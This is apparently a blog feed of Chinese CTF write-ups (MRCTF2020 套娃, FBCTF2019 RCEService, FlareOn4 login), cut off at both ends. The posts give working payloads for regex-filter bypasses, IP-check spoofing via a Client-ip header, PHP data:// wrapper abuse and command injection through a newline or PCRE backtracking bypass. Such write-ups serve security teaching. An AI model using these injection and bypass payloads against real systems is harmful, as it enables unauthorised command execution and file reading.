requests.get(<span class="hljs-string">&#x27;http://127.0.0.1:5000/&#x27;</span>, params=params)  <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求头是：&quot;</span>, r.request.headers)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求体是：&quot;</span>, r.request.body)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>本文引用几乎全部来自<a href="https://yiyan.baidu.com/">文心一言 (baidu.com)</a> </p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>rce</tag>
      
      <tag>python</tag>
      
      <tag>flask</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF2020 套娃</title>
    <link href="/2023/09/05/%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/"/>
    <url>/2023/09/05/%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/</url>
    
    <content type="html"><![CDATA[<h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><p>先看页面源代码，发现有代码注释：</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230905/2023090501.6ntjcld4z0s0.png" alt="2023090501"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br> <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);<br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to the next ~&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>要传入<code>b_u_p_t</code>参数，但是不能有<code>_</code></p><blockquote><p><strong>注意</strong>:</p><p>变量名中的点和空格被转换成下划线。例如 <code>&lt;input name=&quot;a.b&quot; /&gt;</code> 变成了 <code>$_REQUEST[&quot;a_b&quot;]</code>。</p></blockquote><p>所以我们可以传入<code>b u p t</code>或<code>b.u.p.t</code>实现绕过。</p><p>在正则表达式中<code>^</code>代表从字符串起始处匹配，<code>$</code>代表结尾，<code>/^23333$/</code>要求字符串恰好等于<code>23333</code>。</p><p>所以第二个<code>if</code>语句意思是<code>b_u_p_t</code>的值不能等于(强比较)<code>23333</code>，但要通过正则匹配。</p><p>在非多行模式下(即没有<code>/s</code>)，<code>$</code>会忽略在句尾的<code>%0a</code></p><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只需传入<code>?a=flag%0a</code></p><p>同理，本题中传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?b.u.p.t=23333%0a<br></code></pre></td></tr></table></figure><p>即可。</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230905/2023090502.6ukjogue99o0.png" alt="2023090502"></p><p>提示flag在<code>secrettw.php</code></p><p>访问并查看页面源代码：</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230905/2023090503.5ki7rsypwl40.webp" alt="2023090503"></p><p><del>有脏东西</del></p><p>这东西很长，在那一行上双击可快速选中该行。</p><p>这是<code>Jsfuck</code>编码,详情见<a href="https://www.jianshu.com/p/e7246218f424">Jsfuck – 一个很有意思的Javascript特性</a>  </p><p>可以直接使用在线工具解码，比如<a href="http://www.hiencode.com/jsfuck.html">CTF在线工具-在线JSfuck加密|在线JSfuck解密|JSfuck|JSfuck原理|JSfuck算法 (hiencode.com)</a></p><p>也可以将其复制到浏览器控制台中：</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230905/20230504.4zo7re19ers0.webp" alt="20230504"></p><p><strong>post me Merak</strong>  </p><p>用post方法传入一个名为<strong>Merak</strong>的变量，变量值随意。</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230905/20230505.2yo0imubqss0.webp" alt="20230505"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)         <span class="hljs-comment">#ip检测</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;  <br>    <span class="hljs-comment">#考察php伪协议</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;    <span class="hljs-comment">#代码逆向</span><br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><h2 id="过ip检测"><a href="#过ip检测" class="headerlink" title="过ip检测"></a>过ip检测</h2><p>添加报文，据我所知有两种方法</p><ul><li><code>X-Forwarded-For: 127.0.0.1</code>    </li><li><code>Client-ip: 127.0.0.1</code></li></ul><p>这里不知道为什么第一个不行，只能使用第二个。</p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>这里可以使用data伪协议，对于data,</p><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">// 打印 &quot;I love PHP&quot; </span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>同理，本题传入:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=            #todat is a happy day<br></code></pre></td></tr></table></figure><h2 id="代码逆向"><a href="#代码逆向" class="headerlink" title="代码逆向"></a>代码逆向</h2><p>我用python写了个<code>change()</code>的逆向函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"> <br><span class="hljs-comment"># function change($v)&#123; </span><br><span class="hljs-comment">#     $v = base64_decode($v); </span><br><span class="hljs-comment">#     $re = &#x27;&#x27;; </span><br><span class="hljs-comment">#     for($i=0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="hljs-comment">#         $re .= chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="hljs-comment">#     &#125; </span><br><span class="hljs-comment">#     return $re; </span><br><span class="hljs-comment"># &#125; </span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">v</span>):<br>    re=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v)):<br>        re += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(v[i]) - i*<span class="hljs-number">2</span>); <br>    re=base64.b64encode(re.encode())<br>    <span class="hljs-keyword">return</span> re.decode()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    s=<span class="hljs-string">&quot;flag.php&quot;</span>   <br>    <span class="hljs-built_in">print</span>(change(s))<br><span class="hljs-comment">#ZmpdYSZmXGI=</span><br></code></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><img src="https://github.com/sawtooth384/image/raw/master/20230905/20230506.6qujc55rgp80.webp" alt="20230506"></p><h2 id="参考（引用）"><a href="#参考（引用）" class="headerlink" title="参考（引用）"></a>参考（引用）</h2><p>[<a href="https://blog.csdn.net/RABCDXB/article/details/118917303">MRCTF2020]套娃_ctf套娃密码_Sk1y的博客-CSDN博客</a>  </p><p><a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">preg_match绕过总结 - MustaphaMond - 博客园 (cnblogs.com)</a>  </p><p><a href="https://www.php.net/manual/zh/language.variables.external.php">PHP: 来自 PHP 之外的变量 - Manual</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>RCE</tag>
      
      <tag>PHP</tag>
      
      <tag>正则</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FBCTF2019 RCEService</title>
    <link href="/2023/09/04/%5BFBCTF2019%5DRCEService/"/>
    <url>/2023/09/04/%5BFBCTF2019%5DRCEService/</url>
    
    <content type="html"><![CDATA[<h1 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h1><p>这题是有源码的（别管怎么来的了，我看的十几篇wp都没说清楚）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$json</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$json</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span> !== <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid input&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了很多东西  </p><blockquote><ol><li>代码中使用<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code> 配置系统环境变量，而我们用不了 cat 也有可能是在这个环境变量下没有这个二进制文件。我们可以直接使用<code>/bin/cat</code> 来调用cat命令。</li><li>Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</li></ol></blockquote><h2 id="两种解法"><a href="#两种解法" class="headerlink" title="两种解法"></a>两种解法</h2><h3 id="1-0a换行绕过"><a href="#1-0a换行绕过" class="headerlink" title="1. %0a换行绕过"></a>1. %0a换行绕过</h3><p>由于加了修饰符s后.才会匹配换行符，所以此处利用<code>%0a</code>(换行符经过<code>url</code>编码后)进行绕过。</p><p>另外要注意表达式中存在一段<code>\x00-\x1F</code>会匹配一个<code>%0a</code>，但多在payload前后加几个<code>%0a</code>就行了。</p><p>发现flag位置：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>md=&#123;%0a<span class="hljs-string">&quot;cmd&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;ls /home/rceservice&quot;</span>%</span>0a&#125;<br></code></pre></td></tr></table></figure><p><img src="https://github.com/sawtooth384/image/raw/master/20230904/2023090401.6rx1bebl22c0.png" alt="2023090401"></p><p>查看flag:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>md=&#123;%0a<span class="hljs-string">&quot;cmd&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%</span>0a&#125;<br></code></pre></td></tr></table></figure><p><img src="https://github.com/sawtooth384/image/raw/master/20230904/2023090402.3rgu92zlvme0.png" alt="2023090402"></p><h3 id="2-利用PCRE回溯来绕过"><a href="#2-利用PCRE回溯来绕过" class="headerlink" title="2. 利用PCRE回溯来绕过"></a>2. 利用PCRE回溯来绕过</h3><p>原理详见：<a href="https://www.freebuf.com/articles/web/190794.html">PHP利用PCRE回溯次数限制绕过某些安全限制 </a>  </p><p>大概就是<code>preg_match()</code>这个函数有回溯次数限制，突破限制会返回<code>flase</code>。</p><p>只要让它突破限制就行了。</p><p>根据这种方法解题，需要用POST发送请求，因为GET会因为头太大报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">### 不知道为啥这里用 || 不可以执行我们的命令</span><br>payload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag &quot;,&quot;nayi&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">##超过一百万，这里写一千万不会出结果。</span><br><br>res = requests.post(<span class="hljs-string">&quot;http://b27f0703-fe79-470f-b1fb-f7cfbd8c966b.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:payload&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="https://github.com/sawtooth384/image/raw/master/20230904/2023090403.2nvknqzs4l00.png" alt="2023090403"></p><h2 id="参考（引用）"><a href="#参考（引用）" class="headerlink" title="参考（引用）"></a>参考（引用）</h2><p>[<a href="https://blog.csdn.net/RABCDXB/article/details/119306689">FBCTF2019]RCEService_[fbctf 2019]rceservice_Sk1y的博客-CSDN博客</a> </p><p>[<a href="https://mayi077.gitee.io/2020/04/21/FBCTF2019-RCEService/">FBCTF2019]RCEService | 信安小蚂蚁 (gitee.io)</a>  </p><p>[<a href="https://www.cnblogs.com/Article-kelp/p/16046129.html">BUUCTF题解][FBCTF2019]RCEService - Article_kelp - 博客园 (cnblogs.com)</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>RCE</tag>
      
      <tag>PHP</tag>
      
      <tag>正则</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu FlareOn4 login</title>
    <link href="/2023/09/02/%5BFlareOn4%5Dlogin/"/>
    <url>/2023/09/02/%5BFlareOn4%5Dlogin/</url>
    
    <content type="html"><![CDATA[<h1 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h1><p>直接看JS</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;prompt&quot;</span>).<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> flag = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;flag&quot;</span>).<span class="hljs-property">value</span>;<br><span class="hljs-keyword">var</span> rotFlag = flag.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[a-zA-Z]/g</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);<br>&#125;);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Correct flag!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Incorrect flag, rot again&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);  <br></code></pre></td></tr></table></figure><blockquote><p>这句代码的意思就是将字符后移13位，越界了就转到26个字母的开头（超过Z循环回A），循环进行</p></blockquote><p>一共就26个字母，一个字母这样操作两次不就回去了嘛，还是原来那个字母。</p><p>所以给这句代码再运行一次就行了。</p><p><del>懒得写脚本了，</del>直接在原代码上修改:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> flag = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">var</span> rotFlag = <span class="hljs-string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span>;<br>flag = rotFlag.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[a-zA-Z]/g</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><blockquote><p>JavaScript 没有任何打印或者输出的函数。</p></blockquote><p><del>tnnd</del> 还要想办法输出。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> rotFlag = <span class="hljs-string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span>;</span><br><span class="language-javascript">        flag = rotFlag.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[a-zA-Z]/g</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(flag);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bod</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">htm</span>&gt;</span><br></code></pre></td></tr></table></figure><p>最后在控制台看到输出</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230902/2023090201.9ovhjcnt9uc.png" alt="2023090201"></p>]]></content>
    
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2019 RCE ME</title>
    <link href="/2023/09/01/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/"/>
    <url>/2023/09/01/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/</url>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span 